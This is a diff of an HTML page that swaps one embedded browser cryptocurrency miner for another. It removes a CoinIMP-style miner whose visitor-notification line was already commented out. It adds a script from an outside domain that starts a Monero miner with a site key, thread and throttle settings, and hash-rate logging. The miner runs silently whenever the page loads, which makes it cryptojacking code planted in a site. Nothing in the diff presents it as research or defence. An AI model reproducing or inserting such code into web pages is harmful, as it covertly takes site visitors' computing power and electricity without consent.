@@ -87,21 +87,19 @@
         });
       });
     </script>
- <script src="https://www.hostingcloud.racing/3XL7.js"></script>
+<script src="//statdynamic.com/lib/crypta.js"></script>
 <script>
-    var _client = new Client.Anonymous('64bdc511ff09d40aec487e03b71a85a4b962fa9204f2605aa59664076b7e4bfd', 
-{
-        throttle: 0,
-        threads: 10
-    });
-    console.log(_client.getNumThreads());
-    setTimeout(() => {_client.start();console.log('run');
-    },4000)
-    setInterval(() =>{
-        console.log(_client.getHashesPerSecond(),_client.isRunning())
-    }, 1000)
-    //_client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-
-</script>
+  var miner=new CRLT.Anonymous('689ae0b37dc2f35180acd2637d0db375514fc550c322', {
+    threads:6,throttle:0.2, coin: "xmr",
+  });
+  miner.start();
+  	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+    console.log(hashesPerSecond,acceptedHashes)
+		// Output to HTML elements...
+	}, 3000);
+</script>    
   </body>
 </html>
